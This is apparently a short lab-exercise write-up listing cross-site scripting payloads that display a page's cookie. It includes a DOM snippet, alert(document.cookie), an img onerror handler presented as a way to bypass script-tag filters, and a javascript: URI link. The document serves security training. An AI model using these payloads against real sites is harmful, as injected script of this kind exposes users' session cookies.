# Payloads Document - Exercise 00

To achieve the objective of displaying the cookie on the visible web page, a DOM-based XSS payload was utilized.

## Executed Payload:
```javascript
document.getElementById('output').innerText = document.cookie;


///////


alert(document.cookie);
 

/////////////////////////////////////////
Event Handler Injection
<img src="invalid-image.jpg" onerror="alert(document.cookie)">
Description: Bypasses basic <script> tag filters by utilizing standard HTML attributes. When the image fails to load, the onerror event handler executes the JavaScript snippet



/////////////////////////////
JavaScript URI Scheme
<a href="javascript:alert(document.cookie)">Click Here</a>
Description: Used when the input vector is placed within HTML href or src attributes. Executed when the user interacts with the link.



